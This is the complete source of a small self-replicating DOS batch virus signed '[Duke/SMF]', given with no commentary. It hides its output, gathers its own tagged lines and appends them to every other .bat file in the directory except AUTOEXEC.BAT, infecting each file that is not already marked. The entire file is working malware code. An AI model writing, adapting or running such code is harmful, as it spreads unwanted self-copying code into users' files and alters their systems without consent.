@ctty nul%SMF%
if "%1=="SMF goto SMFz
echo.>SMF
find "SMF"<%0>>SMF
for %%b in (*.bat) do if not %%b==AUTOEXEC.BAT call %0 SMF %%b
del SMF
goto SMFe
:SMFz
find "SMF"<%2
if errorlevel 1 type SMF>>%2
:SMFe [Duke/SMF]
